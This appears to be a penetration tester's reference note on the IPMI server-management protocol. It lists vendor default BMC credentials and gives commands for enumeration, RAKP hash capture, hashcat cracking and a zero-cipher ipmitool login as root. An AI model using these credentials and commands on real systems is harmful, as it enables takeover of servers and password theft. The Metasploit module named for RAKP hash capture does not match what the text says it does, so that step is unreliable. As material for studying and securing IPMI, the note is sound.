---
title: "IPMI"
tags:
  - protocol
  - networking
created: "2025-02-25"
---

# IPMI

## Basic Information
- **Full Name:**  Intelligent Platform Management Interface
- **Abbreviation:** IPMI
- **OSI Layer:** Not strictly applicable (operates as an out-of-band management interface)
- **Default Port(s):** 623
- **Protocol Type:** UDP

## Description
`IPMI` is a set of standardized specifications for hardware-based host management systems. It provides system administrators with remote control over servers regardless of the host’s state—by interfacing directly with the Baseboard Management Controller (BMC). This allows for system monitoring, management, and even remote upgrades independently of the host's BIOS, CPU, or operating system.

## Use Cases
- Modify BIOS settings before the OS loads.
- Access and manage systems even when they are fully powered down.
- Remotely troubleshoot or recover a system after a failure.
- Update system firmware without requiring physical access.

## Dangerous Settings
**Default Credentials:** Many BMCs ship with default usernames and passwords (e.g., Dell iDRAC uses `root`/`calvin`, Supermicro IPMI uses `ADMIN`/`ADMIN`). Failure to change these can lead to unauthorized access.
**RAKP Protocol Vulnerability:** In IPMI 2.0, a flaw in the RAKP authentication process sends a salted SHA1 or MD5 hash before authentication. This allows attackers to capture password hashes for offline cracking.
**Password Reuse:** Weak or reused credentials across systems can lead to lateral movement and broader network compromise.

### Unique default password

| Product Name                                        | Default Username | Default Password                        |
| --------------------------------------------------- | ---------------- | --------------------------------------- |
| **HP Integrated Lights Out (iLO)**                  | Administrator    | <factory randomized 8-character string> |
| **Dell Remote Access Card (iDRAC, DRAC)**           | root             | calvin                                  |
| **IBM Integrated Management Module (IMM)**          | USERID           | PASSW0RD (with a zero)                  |
| **Fujitsu Integrated Remote Management Controller** | admin            | admin                                   |
| **Supermicro IPMI (2.0)**                           | ADMIN            | ADMIN                                   |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)** | root             | changeme                                |
| **ASUS iKVM BMC**                                   | admin            | admin                                   |
## Attack Vectors
1. **Exploitation of Default Credentials:** Using well-known default username/password combinations to gain access.
2. **RAKP Protocol Exploitation:** Capturing and cracking password hashes during the authentication process.

3. **BMC Compromise:** Once access is achieved, attackers can control system functions such as monitoring, rebooting, and even reinstalling the host operating system.

## Enumeration
### Banner Grabbing
```bash
nc -vn <target_ip> 623
```

### Service Scanning
#### Nmap scan
```bash
sudo nmap -sU --script ipmi-version -p 623 <target_ip>
```
#### Metasploit Modules
##### Version Detection
Use this module to confirm that IPMI (typically version 2.0) is running and accessible.
```bash
msf > use auxiliary/scanner/ipmi/ipmi_version
```

##### Flaw in the RAKP Protocol in IPMI 2.0
If default credentials fail, this module leverages the RAKP protocol flaw. During the authentication process. The server sends a salted hash (SHA1 or MD5) of the password. This module captures the hash, which can then be cracked offline (e.g using Hashcat in mode 7300).
```bash
msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
```

An example Hashcat mask attack might look like:
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
This command attempts all combinations of uppercase letters and digits for an eight-character password.

##### Zero cipher authentication bypass
Zero cipher authentication bypass resulting in administrative access.
Check if vulnerable
```bash
msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
```

Then connect
```bash
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
```

## Related
- iDRAC
- HP iLO
- SNMP (for alerting and monitoring)
## Fun Facts
- Exploiting the RAKP flaw is one of the few methods to extract sensitive credential hashes even when default credentials have been changed.
## References
- https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/
- https://viperone.gitbook.io/pentest-everything/psmapexec/methods/ipmi
- 
